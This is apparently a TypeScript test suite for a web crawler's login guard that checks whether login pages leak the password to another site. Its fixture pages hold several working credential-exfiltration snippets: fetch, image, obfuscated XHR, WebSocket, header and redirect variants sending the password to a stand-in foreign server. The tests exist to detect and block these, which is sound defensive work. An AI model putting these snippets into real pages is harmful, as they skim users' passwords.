import { createServer, type Server } from 'node:http';
import { join } from 'node:path';
import { chromium } from '@playwright/test';
import { afterAll, beforeAll, describe, expect, it, type TestContext } from 'vitest';
import { kesfet } from '../../src/kesif/index.js';
import {
  ayniSiteMi, ayniSiteOriginMi, izinliKumedeMi, kayitliAlanAdi, parolaIzleri, yabanciCerceveler,
} from '../../src/kesif/giris-korumasi.js';
import { geciciDizinAc } from '../yardimci/gecici-dizin.js';

const PAROLA = 'sizmamali-parola';
const kati = process.env.KOBAY_TEST_STRICT === '1';
let tarayiciEngeli: unknown;

/** Yabancı origin'e gelen her istek: "YÖNTEM yol başlıklar gövde"; WebSocket el sıkışması "UPGRADE yol". */
const yabanciIstekler: string[] = [];
/** Hedef origin'e gelen isteklerin yolları. */
const hedefIstekler: string[] = [];
let yabanci: Server;
let hedef: Server;
/**
 * Yabancı site: `localhost` adıyla (hedef `127.0.0.1`). Aynı makinede port serbest olduğu için
 * yabancıyı ayıran ana makine adıdır; `localhost` ile `127.0.0.1` farklı sitelerdir.
 */
let yabanciUrl = '';
/** Aynı yabancı sunucu, hedefle aynı ana makine adıyla (`127.0.0.1`, başka port): aynı site. */
let yabanciPortUrl = '';
let hedefUrl = '';
/** Aynı-site senaryosu: `*.localhost` Chromium'da geri döngü adresine çözülür, /etc/hosts gerekmez. */
let hedefSiteUrl = '';
let yabanciSiteUrl = '';
/** Siteler-arası senaryo: `kotu.localhost`, `kobay.localhost` sitesinden ayrı bir sitedir. */
let kotuSiteUrl = '';

function dinle(sunucu: Server): Promise<string> {
  return new Promise((coz) => {
    sunucu.listen(0, '127.0.0.1', () => {
      const adres = sunucu.address();
      coz(`http://127.0.0.1:${typeof adres === 'object' && adres !== null ? adres.port : 0}`);
    });
  });
}

/** Parola alanı olan, `onsubmit` ile verilen betiği çalıştıran giriş sayfası. */
function girisSayfasi(betik: string, action = '/giris', y = yabanciUrl): string {
  return `<!doctype html><html><body><form id="f" action="${action}" method="post">`
    + '<input type="text" name="k"><input type="password" name="p"><button type="submit">Log in</button></form>'
    + `<script>const Y=${JSON.stringify(y)};document.getElementById('f').addEventListener('submit',(e)=>{`
    + `const k=e.target.k.value,p=e.target.p.value;${betik}});</script></body></html>`;
}

const sayfalar: Record<string, () => string> = {
  // fetch ile JSON gövdede parola, ardından kendi origin'ine geçiş.
  '/fetch-post': () => girisSayfasi(
    "e.preventDefault();fetch(Y+'/topla',{method:'POST',mode:'no-cors',body:JSON.stringify({k,p})}).finally(()=>{location.href='/panel';});",
  ),
  // Görsel isteğiyle sorgu dizesinde parola; form normal biçimde kendi origin'ine gider.
  '/img-get': () => girisSayfasi("new Image().src=Y+'/piksel?p='+encodeURIComponent(p);"),
  // Parola kodlanıp gizlenir (ters + base64) ve XHR PUT ile gönderilir; sayfa yerinde kalır.
  '/xhr-gizli': () => girisSayfasi(
    "e.preventDefault();const x=new XMLHttpRequest();x.open('PUT',Y+'/topla');x.send(btoa(p.split('').reverse().join('')));",
  ),
  // Meşru uygulama: giriş sırasında analytics GET ve parolasız beacon; form kendi origin'ine gider.
  '/analytics': () => girisSayfasi("fetch(Y+'/analytics.js',{mode:'no-cors'});navigator.sendBeacon(Y+'/beacon','event=login');"),
  // Form hedefi aynı origin, sunucu 307 ile gövdeyi yabancı origin'e yönlendirir.
  '/yonlendirme-307': () => girisSayfasi('', '/giris-307'),
  // SPA: parolayı sessionStorage'da saklar, URL'yi hemen değiştirir; parolayı giriş penceresi
  // kapandıktan sonra keşfin açtığı sayfa (panel) gönderir.
  '/gecikmeli': () => girisSayfasi(
    "e.preventDefault();sessionStorage.setItem('p',p);history.pushState({},'','/spa-panel');",
  ),
  // Giriş sayfası açılışta service worker kaydetmeye çalışır; worker kurulunca yabancıya GET atar.
  '/service-worker': () => `<script>navigator.serviceWorker&&navigator.serviceWorker.register('/sw.js').catch(()=>{});</script>${
    girisSayfasi('')}`,
  // Gönderimde yabancı origin'e WebSocket açar ve parolayı mesaj olarak yollar.
  '/ws-mesaj': () => girisSayfasi("const w=new WebSocket(Y.replace('http','ws')+'/ws');w.onopen=()=>w.send(p);"),
  // Parolayı WebSocket adresinin sorgu dizesine koyar.
  '/ws-adres': () => girisSayfasi("new WebSocket(Y.replace('http','ws')+'/ws?p='+encodeURIComponent(p));"),
  // Parolayı JavaScript'in ayarlayabildiği Accept başlığına koyan siteler-arası GET.
  '/accept-baslik': () => girisSayfasi("fetch(Y+'/baslik',{mode:'no-cors',headers:{Accept:p}});"),
  // Aynı makinede başka porttaki API'ye (127.0.0.1:P1 → 127.0.0.1:P2) giriş POST'u, sonra panele geçer.
  '/ayni-host-baska-port': () => girisSayfasi(
    "e.preventDefault();fetch(Y+'/api/login',{method:'POST',mode:'no-cors',body:JSON.stringify({k,p})}).finally(()=>{location.href='/panel';});",
    '/giris',
    yabanciPortUrl,
  ),
  // Giriş sırasında yabancı CDN'den parolasız GET (parola "gzip"/"Mozilla" olunca başlıkta geçer).
  '/cdn-get': () => girisSayfasi("fetch(Y+'/cdn.js',{mode:'no-cors'});"),
  // Aynı site (app.kobay.localhost → api.kobay.localhost): parolayı API'ye POST eder, sonra panele geçer.
  '/ayni-site': () => girisSayfasi(
    "e.preventDefault();fetch(Y+'/api/login',{method:'POST',mode:'no-cors',body:JSON.stringify({k,p})}).finally(()=>{location.href='/panel';});",
    '/giris',
    yabanciSiteUrl,
  ),
  // HTML formu parolayı aynı sitedeki API alt alanına (api.kobay.localhost) gönderir.
  '/form-ayni-site': () => girisSayfasi('', `${yabanciSiteUrl}/api/giris`, yabanciSiteUrl),
  // HTML formu parolayı başka siteye (kotu.localhost) gönderir.
  '/form-baska-site': () => girisSayfasi('', `${kotuSiteUrl}/api/giris`, kotuSiteUrl),
  // Giriş sonrası (oturum çereziyle) uygulamanın kendi siteler-arası API'sine parolasız POST.
  '/panel-yazma': () => `<!doctype html><html><body><h1>Panel</h1><script>const Y=${JSON.stringify(yabanciUrl)};`
    + "if(document.cookie.includes('oturum=1')){fetch(Y+'/api/olay',{method:'POST',mode:'no-cors',body:'olay=acildi'});}"
    + '</script></body></html>',
  // Giriş sonrası (oturum çereziyle) uygulamanın kendi siteler-arası gerçek zamanlı kanalı.
  '/panel-ws': () => `<!doctype html><html><body><h1>Panel</h1><script>const Y=${JSON.stringify(yabanciUrl)};`
    + "if(document.cookie.includes('oturum=1')){new WebSocket(Y.replace('http','ws')+'/canli');}"
    + '</script></body></html>',
  // Giriş sonrası sessionStorage'daki parolayı siteler-arası POST gövdesiyle gönderir.
  '/panel-parola-post': () => `<!doctype html><html><body><h1>Panel</h1><script>const Y=${JSON.stringify(yabanciUrl)};`
    + "const p=sessionStorage.getItem('p');if(p){fetch(Y+'/api/topla',{method:'POST',mode:'no-cors',body:p});}"
    + '</script></body></html>',
};

/** Keşfin girişten sonra açtığı sayfa: sessionStorage'da parola varsa yabancıya gönderir. */
function panelSayfasi(): string {
  return `<!doctype html><html><body><h1>Panel</h1><script>const Y=${JSON.stringify(yabanciUrl)};`
    + "const p=sessionStorage.getItem('p');if(p){new Image().src=Y+'/gec?p='+encodeURIComponent(p);}</script></body></html>";
}

beforeAll(async () => {
  try {
    const tarayici = await chromium.launch({ headless: true });
    await tarayici.close();
  } catch (hata) {
    tarayiciEngeli = hata;
    return;
  }
  yabanci = createServer((istek, yanit) => {
    let govde = '';
    istek.on('data', (parca: Buffer) => { govde += parca.toString(); });
    istek.on('end', () => {
      yabanciIstekler.push(`${istek.method ?? ''} ${istek.url ?? ''} ${JSON.stringify(istek.headers)} ${govde}`);
      if (istek.url === '/api/giris' && istek.method === 'POST') {
        // Aynı sitedeki API girişi kabul edip uygulamaya geri yönlendirir: giriş uygulamanın
        // origin'inde biter (liste boşken de dönüş şartı geçerli).
        yanit.writeHead(302, { location: `${hedefSiteUrl}/panel` });
        yanit.end();
        return;
      }
      if (istek.url === '/giris-formu') {
        // Aynı sitedeki başka origin'de barındırılan giriş sayfası (yönlendirme senaryosu).
        yanit.writeHead(200, { 'content-type': 'text/html' });
        yanit.end(girisSayfasi(''));
        return;
      }
      yanit.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' });
      yanit.end('ok');
    });
  });
  yabanci.on('upgrade', (istek, soket) => {
    yabanciIstekler.push(`UPGRADE ${istek.url ?? ''}`);
    soket.destroy();
  });
  yabanciPortUrl = await dinle(yabanci);
  yabanciUrl = yabanciPortUrl.replace('127.0.0.1', 'localhost');
  hedef = createServer((istek, yanit) => {
    const yol = new URL(istek.url ?? '/', 'http://x').pathname;
    hedefIstekler.push(yol);
    istek.resume();
    istek.on('end', () => {
      if (yol === '/giris' && istek.method === 'POST') {
        yanit.writeHead(302, { location: '/panel', 'set-cookie': 'oturum=1; Path=/' });
        yanit.end();
        return;
      }
      if (yol === '/yonlendir-api') {
        yanit.writeHead(302, { location: `${yabanciSiteUrl}/giris-formu` });
        yanit.end();
        return;
      }
      if (yol === '/giris-307') {
        yanit.writeHead(307, { location: `${yabanciUrl}/topla` });
        yanit.end();
        return;
      }
      if (yol === '/sw.js') {
        yanit.writeHead(200, { 'content-type': 'text/javascript' });
        yanit.end(`self.addEventListener('install',()=>{fetch(${JSON.stringify(yabanciUrl)}+'/sw-kuruldu');});`);
        return;
      }
      const sayfa = sayfalar[yol];
      yanit.writeHead(200, { 'content-type': 'text/html' });
      yanit.end(sayfa ? sayfa() : panelSayfasi());
    });
  });
  hedefUrl = await dinle(hedef);
  hedefSiteUrl = hedefUrl.replace('127.0.0.1', 'app.kobay.localhost');
  yabanciSiteUrl = yabanciPortUrl.replace('127.0.0.1', 'api.kobay.localhost');
  kotuSiteUrl = yabanciPortUrl.replace('127.0.0.1', 'kotu.localhost');
});

afterAll(async () => {
  await Promise.all([yabanci, hedef].filter(Boolean).map((sunucu) => new Promise((coz) => { sunucu.close(coz); })));
});

function tarayiciMumkun(context: TestContext): boolean {
  if (!tarayiciEngeli) return true;
  const ozet = String(tarayiciEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium atlanamaz: ${ozet}`);
  context.skip(`Gerçek Chromium bu ortamda engelli: ${ozet}`);
  return false;
}

interface DenemeSecenekleri { maxSayfa?: number; parola?: string; kok?: string; basla?: string }

async function girisDene(yol: string, maxSayfaVeya: number | DenemeSecenekleri = 1): ReturnType<typeof kesfet> {
  const s: DenemeSecenekleri = typeof maxSayfaVeya === 'number' ? { maxSayfa: maxSayfaVeya } : maxSayfaVeya;
  const kok = s.kok ?? hedefUrl;
  const dizin = await geciciDizinAc('kobay-giris-korumasi-');
  return kesfet({
    baseUrl: `${kok}${s.basla ?? ''}`,
    loginUrl: `${kok}${yol}`,
    kimlik: { username: 'demo', password: s.parola ?? PAROLA, origin: new URL(kok).origin },
    storageStateYolu: join(dizin, 'storage.json'),
    maxSayfa: s.maxSayfa ?? 1,
    sayfaZamanAsimiMs: 5_000,
  });
}

function parolaGitti(): boolean {
  return yabanciIstekler.some((satir) => satir.includes(PAROLA) || satir.includes(encodeURIComponent(PAROLA)));
}

describe('giriş sırasında JavaScript ile başka origin\'e gönderim', () => {
  it('fetch ile JSON gövdede parola gönderen sayfada girişi reddeder, parola yabancıya ulaşmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/fetch-post')).rejects.toThrow('tried to send the credentials to a different site');
    expect(parolaGitti()).toBe(false);
    expect(yabanciIstekler.filter((satir) => satir.startsWith('POST'))).toEqual([]);
  });

  it('parolayı sorgu dizesine koyan çapraz-origin GET\'i de keser ve girişi reddeder', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/img-get')).rejects.toThrow('tried to send the credentials to a different site');
    expect(parolaGitti()).toBe(false);
  });

  it('kodlanıp gizlenmiş parolayı taşıyan çapraz-origin PUT\'u keser; giriş olmadıysa nedenini söyler', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/xhr-gizli')).rejects.toThrow(`PUT ${yabanciUrl}`);
    expect(yabanciIstekler.filter((satir) => satir.startsWith('PUT'))).toEqual([]);
  });

  it('307 yönlendirmesi ENGELLENEMEZ: parola yabancıya ulaşır, kobay yalnız tespit edip girişi reddeder', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/yonlendirme-307')).rejects.toThrow('tried to send the credentials to a different site');
    // Sahte güvence olmasın: yönlendirilmiş ayak route'a uğramaz, gövde gerçekten gitti.
    expect(parolaGitti()).toBe(true);
  });

  it('giriş penceresi kapandıktan sonra parolayı gönderen sayfayı keser ve keşfi reddeder', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    // maxSayfa 2: giriş sayfasından sonra keşif panele gider; parola orada, girişten sonra gönderilir.
    await expect(girisDene('/gecikmeli', 2)).rejects.toThrow('after login, to send the credentials to a different site');
    expect(parolaGitti()).toBe(false);
    expect(yabanciIstekler.filter((satir) => satir.includes('/gec'))).toEqual([]);
  });

  it('service worker kaydını engeller: worker betiği hiç indirilmez, worker isteği yabancıya ulaşmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    hedefIstekler.length = 0;
    const harita = await girisDene('/service-worker');
    expect(harita.loggedIn).toBe(true);
    expect(hedefIstekler).not.toContain('/sw.js');
    expect(yabanciIstekler.filter((satir) => satir.includes('/sw-kuruldu'))).toEqual([]);
  });

  it('çapraz-origin WebSocket\'i sunucuya hiç bağlamaz; mesajdaki parola yabancıya ulaşmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    const harita = await girisDene('/ws-mesaj');
    expect(harita.loggedIn).toBe(true);
    expect(yabanciIstekler.filter((satir) => satir.startsWith('UPGRADE'))).toEqual([]);
    expect(parolaGitti()).toBe(false);
  });

  it('parolayı WebSocket adresine koyan sayfada girişi reddeder, bağlantı yabancıya ulaşmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/ws-adres')).rejects.toThrow('tried to send the credentials to a different site');
    expect(yabanciIstekler.filter((satir) => satir.startsWith('UPGRADE'))).toEqual([]);
  });

  it('parolasız analytics GET\'ini geçirir, beacon\'ı keser ama meşru girişi bozmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    const harita = await girisDene('/analytics');
    expect(harita.loggedIn).toBe(true);
    expect(yabanciIstekler.some((satir) => satir.startsWith('GET /analytics.js'))).toBe(true);
    expect(yabanciIstekler.filter((satir) => satir.startsWith('POST'))).toEqual([]);
    expect(parolaGitti()).toBe(false);
  });
});

describe('giriş sonrası: uygulamanın kendi siteler-arası trafiği serbest, parola değil', () => {
  it('giriş sonrası parolasız siteler-arası POST teslim edilir ve keşif başarılı olur', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    // Giriş penceresinde /panel yüklenir (çerez var ama sayfa POST atmaz); keşif sonra /panel-yazma'ya gider.
    const harita = await girisDene('/analytics', { maxSayfa: 2, basla: '/panel-yazma' });
    expect(harita.loggedIn).toBe(true);
    expect(harita.pages.map((sayfa) => new URL(sayfa.url).pathname)).toContain('/panel-yazma');
    expect(yabanciIstekler.filter((satir) => satir.startsWith('POST /api/olay'))).toHaveLength(1);
  });

  it('giriş sonrası siteler-arası WebSocket sunucuya bağlanır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    const harita = await girisDene('/analytics', { maxSayfa: 2, basla: '/panel-ws' });
    expect(harita.loggedIn).toBe(true);
    await expect.poll(() => yabanciIstekler.filter((satir) => satir === 'UPGRADE /canli'), { timeout: 3_000 })
      .toHaveLength(1);
  });

  it('giriş sonrası parolayı POST gövdesinde taşıyan siteler-arası isteği keser ve keşfi reddeder', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/gecikmeli', { maxSayfa: 2, basla: '/panel-parola-post' }))
      .rejects.toThrow('after login, to send the credentials to a different site');
    expect(yabanciIstekler.filter((satir) => satir.includes('/api/topla'))).toEqual([]);
    expect(parolaGitti()).toBe(false);
  });

  it('parola "gzip" ya da "Mozilla" iken sıradan CDN GET\'i sızıntı sayılmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    for (const parola of ['gzip', 'Mozilla']) {
      yabanciIstekler.length = 0;
      const harita = await girisDene('/cdn-get', { parola });
      expect(harita.loggedIn).toBe(true);
      expect(yabanciIstekler.some((satir) => satir.startsWith('GET /cdn.js'))).toBe(true);
    }
  });

  it('parolayı Accept başlığına koyan siteler-arası GET giriş penceresinde kesilir, giriş reddedilir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/accept-baslik')).rejects.toThrow('tried to send the credentials to a different site');
    expect(yabanciIstekler.filter((satir) => satir.startsWith('GET /baslik'))).toEqual([]);
    expect(parolaGitti()).toBe(false);
  });

  it('aynı makinede başka porttaki API\'ye (127.0.0.1:P1 → 127.0.0.1:P2) giriş POST\'u gider', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    const harita = await girisDene('/ayni-host-baska-port');
    expect(harita.loggedIn).toBe(true);
    expect(yabanciIstekler.some((satir) => satir.startsWith('POST /api/login') && satir.includes(PAROLA))).toBe(true);
  });

  it('aynı sitedeki API alt alanına (api.kobay.localhost) giriş POST\'u gider, giriş başarılı', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    const harita = await girisDene('/ayni-site', { kok: hedefSiteUrl });
    expect(harita.loggedIn).toBe(true);
    expect(yabanciIstekler.some((satir) => satir.startsWith('POST /api/login') && satir.includes(PAROLA))).toBe(true);
  });

  it('HTML formunun action hedefi aynı sitedeki API alt alanıysa parolayla gönderilir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    const harita = await girisDene('/form-ayni-site', { kok: hedefSiteUrl });
    expect(harita.loggedIn).toBe(true);
    expect(yabanciIstekler.some((satir) => satir.startsWith('POST /api/giris') && satir.includes(PAROLA))).toBe(true);
  });

  it('HTML formunun action hedefi başka siteyse parola yazılmaz, "different site" reddi', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/form-baska-site', { kok: hedefSiteUrl }))
      .rejects.toThrow(/login form submits to a different site \(http:\/\/kotu\.localhost:\d+\)/);
    expect(yabanciIstekler.filter((satir) => satir.startsWith('POST'))).toEqual([]);
  });

  it('giriş sayfası aynı sitede ama başka origin\'deyse (yönlendirme) parola yazılmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    yabanciIstekler.length = 0;
    await expect(girisDene('/yonlendir-api', { kok: hedefSiteUrl }))
      .rejects.toThrow(/login page is on a different origin \(http:\/\/api\.kobay\.localhost:\d+\)/);
    expect(yabanciIstekler.some((satir) => satir.startsWith('GET /giris-formu'))).toBe(true);
    expect(yabanciIstekler.filter((satir) => satir.startsWith('POST'))).toEqual([]);
  });
});

describe('kimliksiz keşif', () => {
  it('service worker\'ı engellemez: worker betiği indirilir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    hedefIstekler.length = 0;
    const dizin = await geciciDizinAc('kobay-giris-korumasi-');
    await kesfet({
      baseUrl: `${hedefUrl}/service-worker`,
      storageStateYolu: join(dizin, 'storage.json'),
      maxSayfa: 1,
      sayfaZamanAsimiMs: 5_000,
    });
    expect(hedefIstekler).toContain('/sw.js');
  });
});

describe('ayniSiteMi', () => {
  it('aynı kayıtlı alan adındaki alt alanları aynı site sayar', () => {
    expect(ayniSiteMi('app.example.com', 'api.example.com')).toBe(true);
    expect(ayniSiteMi('example.com', 'www.example.com')).toBe(true);
    expect(ayniSiteMi('a.shop.co.uk', 'b.shop.co.uk')).toBe(true);
    expect(ayniSiteMi('app.kobay.localhost', 'api.kobay.localhost')).toBe(true);
  });

  it('farklı kayıtlı alan adını, kamu sonekini ve barındırma alt alanlarını ayrı site sayar', () => {
    expect(ayniSiteMi('app.example.com', 'example.net')).toBe(false);
    expect(ayniSiteMi('evil-example.com', 'example.com')).toBe(false);
    expect(ayniSiteMi('shop.co.uk', 'bank.co.uk')).toBe(false);
    expect(ayniSiteMi('shop.com.tr', 'bank.com.tr')).toBe(false);
    expect(ayniSiteMi('shop.com.xy', 'bank.com.xy')).toBe(false);
    expect(ayniSiteMi('me.github.io', 'you.github.io')).toBe(false);
    expect(kayitliAlanAdi('co.uk')).toBeNull();
    expect(kayitliAlanAdi('github.io')).toBeNull();
  });

  it('barındırma platformlarında başka kiracıya parola gitmez (denetim F1)', () => {
    // Denetimin altı örneği.
    expect(ayniSiteOriginMi('https://evil.a.run.app/x', 'https://myapp.a.run.app')).toBe(false);
    expect(ayniSiteOriginMi('https://evil-bucket.s3.amazonaws.com/x', 'https://abc.execute-api.us-east-1.amazonaws.com'))
      .toBe(false);
    expect(ayniSiteOriginMi('https://evil-3000.app.github.dev/x', 'https://me-3000.app.github.dev')).toBe(false);
    expect(ayniSiteOriginMi('https://evil.up.railway.app/x', 'https://myapp.up.railway.app')).toBe(false);
    expect(ayniSiteOriginMi('https://evil.ngrok-free.dev/x', 'https://myapp.ngrok-free.dev')).toBe(false);
    expect(ayniSiteOriginMi('https://evil.lovable.app/x', 'https://myapp.lovable.app')).toBe(false);
    // Listenin geri kalanı.
    for (const sonek of [
      'ngrok-free.app', 'ngrok.app', 'ngrok.io', 'fly.dev', 'onrender.com', 'azurewebsites.net', 'cloudfunctions.net',
      'firebaseapp.com', 'web.app', 'workers.dev', 'pages.dev', 'vercel.app', 'netlify.app', 'herokuapp.com',
      'github.io', 'gitlab.io', 'repl.co', 'replit.app', 'glitch.me', 'surge.sh', 'koyeb.app', 'deno.dev',
      'elasticbeanstalk.com', 'trycloudflare.com', 'loca.lt', 'serveo.net', 'a.run.app', 'app.github.dev', 'up.railway.app',
    ]) expect(ayniSiteOriginMi(`https://evil.${sonek}/x`, `https://myapp.${sonek}`), sonek).toBe(false);
    // Bölgesel Cloud Run, S3, execute-api ve CloudFront: tam origin.
    expect(ayniSiteOriginMi('https://evil-1.us-central1.run.app/x', 'https://myapp-1.us-central1.run.app')).toBe(false);
    expect(ayniSiteOriginMi('https://evil.s3.amazonaws.com/x', 'https://mine.s3.amazonaws.com')).toBe(false);
    expect(ayniSiteOriginMi('https://b.execute-api.eu-west-1.amazonaws.com/x', 'https://a.execute-api.eu-west-1.amazonaws.com'))
      .toBe(false);
    expect(ayniSiteOriginMi('https://d2.cloudfront.net/x', 'https://d1.cloudfront.net')).toBe(false);
    expect(ayniSiteOriginMi('https://mine.s3.amazonaws.com:8443/x', 'https://mine.s3.amazonaws.com')).toBe(false);
    expect(ayniSiteOriginMi('https://mine.s3.amazonaws.com/y', 'https://mine.s3.amazonaws.com')).toBe(true);
    // Aynı kiracının kendi alt alanı; eski yanlış `railway.app` girdisi artık `up.railway.app`.
    expect(ayniSiteOriginMi('https://api.me.github.io/x', 'https://me.github.io')).toBe(true);
    expect(kayitliAlanAdi('myapp.up.railway.app')).toBe('myapp.up.railway.app');
    expect(kayitliAlanAdi('x.a.run.app')).toBe('x.a.run.app');
    expect(kayitliAlanAdi('a.s3.amazonaws.com')).toBeNull();
  });

  it('IP, localhost ve tek etiketli adlarda yalnız birebir eşitlik', () => {
    expect(ayniSiteMi('127.0.0.1', '127.0.0.2')).toBe(false);
    expect(ayniSiteMi('localhost', 'a.localhost')).toBe(false);
    expect(kayitliAlanAdi('127.0.0.1')).toBeNull();
    expect(kayitliAlanAdi('[::1]')).toBeNull();
    expect(kayitliAlanAdi('intranet')).toBeNull();
  });

  it('origin düzeyinde: şema eşit olmalı, port serbest; localhost/IP\'de ana makine adı birebir', () => {
    expect(ayniSiteOriginMi('https://api.example.com/x', 'https://app.example.com')).toBe(true);
    expect(ayniSiteOriginMi('wss://rt.example.com/ws', 'https://app.example.com')).toBe(true);
    expect(ayniSiteOriginMi('http://api.example.com/x', 'https://app.example.com')).toBe(false);
    expect(ayniSiteOriginMi('https://api.example.com:8443/x', 'https://app.example.com')).toBe(true);
    // Denetim F6: tarayıcıların same-site kuralı portu yok sayar (dev: 5173 → 8080 API).
    expect(ayniSiteOriginMi('http://127.0.0.1:4000/x', 'http://127.0.0.1:3000')).toBe(true);
    expect(ayniSiteOriginMi('http://localhost:8080/api', 'http://localhost:5173')).toBe(true);
    expect(ayniSiteOriginMi('http://intranet:8080/api', 'http://intranet:3000')).toBe(true);
    expect(ayniSiteOriginMi('http://[::1]:8080/api', 'http://[::1]:5173')).toBe(true);
    expect(ayniSiteOriginMi('http://127.0.0.1:5173/x', 'http://localhost:5173')).toBe(false);
    expect(ayniSiteOriginMi('http://localhost:8080/x', 'http://127.0.0.1:5173')).toBe(false);
    expect(ayniSiteOriginMi('http://127.0.0.2:3000/x', 'http://127.0.0.1:3000')).toBe(false);
    expect(ayniSiteOriginMi('https://localhost:8080/x', 'http://localhost:5173')).toBe(false);
    expect(ayniSiteOriginMi('ws://127.0.0.1:3000/ws', 'http://127.0.0.1:3000')).toBe(true);
    expect(ayniSiteOriginMi('data:text/plain,x', 'http://127.0.0.1:3000')).toBe(false);
  });
});

describe('izinliKumedeMi: baseUrl aynı-site, auth origin tam eşitlik', () => {
  it('listedeki auth origin yalnız birebir eşleşir; alt alanı, kardeş alanı ve başka portu yabancıdır', () => {
    const app = 'https://app.example.com';
    expect(izinliKumedeMi('https://yourco.okta.com/login', app, ['https://yourco.okta.com'])).toBe(true);
    expect(izinliKumedeMi('wss://yourco.okta.com/ws', app, ['https://yourco.okta.com'])).toBe(true);
    expect(izinliKumedeMi('https://evilco.okta.com/topla', app, ['https://yourco.okta.com'])).toBe(false);
    expect(izinliKumedeMi('https://yourco.okta.com:444/topla', app, ['https://yourco.okta.com'])).toBe(false);
    expect(izinliKumedeMi('http://yourco.okta.com/topla', app, ['https://yourco.okta.com'])).toBe(false);
    expect(izinliKumedeMi('https://auth.example.com:444/topla', 'https://app.example.org', ['https://auth.example.com']))
      .toBe(false);
    expect(izinliKumedeMi('https://evil.example.com/topla', 'https://app.example.org', ['https://auth.example.com']))
      .toBe(false);
    expect(izinliKumedeMi('http://localhost:4001/x', 'http://127.0.0.1:3000', ['http://localhost:4000'])).toBe(false);
  });

  it('baseUrl origin\'i aynı-site kuralını korur (0.2.1): alt alan ve port serbest', () => {
    const auth = ['https://auth.example.com'];
    expect(izinliKumedeMi('https://api.example.com/x', 'https://app.example.com', auth)).toBe(true);
    expect(izinliKumedeMi('https://app.example.com:8443/x', 'https://app.example.com', auth)).toBe(true);
    expect(izinliKumedeMi('http://127.0.0.1:4000/x', 'http://127.0.0.1:3000', [])).toBe(true);
    expect(izinliKumedeMi('https://evil.example.net/x', 'https://app.example.com', auth)).toBe(false);
    // Kimliğin origin'i kümede yoksa yalnız auth origin'ler izinli.
    expect(izinliKumedeMi('https://api.example.com/x', undefined, auth)).toBe(false);
    expect(izinliKumedeMi('data:text/plain,x', 'https://app.example.com', auth)).toBe(false);
  });
});

describe('yabanciCerceveler', () => {
  it('yalnız izinli küme dışındaki http(s) çerçeve originlerini döndürür', () => {
    expect(yabanciCerceveler([
      'https://app.example.com/login',
      'https://api.example.com/widget',
      'https://yourco.okta.com/captcha',
      'https://evil.example.net/frame',
      'https://evil.example.net/second',
      'http://evil.example.net/frame',
    ], 'https://app.example.com', ['https://yourco.okta.com'])).toEqual([
      'https://evil.example.net',
      'http://evil.example.net',
    ]);
  });

  it('about:blank, srcdoc, blob:null ve data çerçevelerini yeni origin saymaz', () => {
    expect(yabanciCerceveler([
      'about:blank',
      'about:srcdoc',
      'blob:null/0f1e2d3c',
      'data:text/html,<p>frame</p>',
      'javascript:void(0)',
    ], 'https://app.example.com', [])).toEqual([]);
  });

  it('blob: çerçeveyi kendisini yaratan origin\'e göre sınıflar', () => {
    expect(yabanciCerceveler([
      'blob:https://app.example.com/0f1e2d3c',
      'blob:https://api.example.com/0f1e2d3c',
      'blob:https://yourco.okta.com/0f1e2d3c',
      'blob:https://evil.example/kimlik',
      'blob:http://localhost:4010/0f1e2d3c',
    ], 'https://app.example.com', ['https://yourco.okta.com'])).toEqual([
      'https://evil.example',
      'http://localhost:4010',
    ]);
  });
});

describe('parolaIzleri', () => {
  it('kısa parolada içerik araması yapmaz, uzun parolada kodlu biçimleri üretir', () => {
    expect(parolaIzleri({ username: 'u', password: 'abc' })).toEqual([]);
    const izler = parolaIzleri({ username: 'u', password: 'a b&c"d' });
    expect(izler).toEqual(expect.arrayContaining(['a b&c"d', 'a%20b%26c%22d', 'a+b%26c%22d', 'a b&c\\"d']));
  });
});
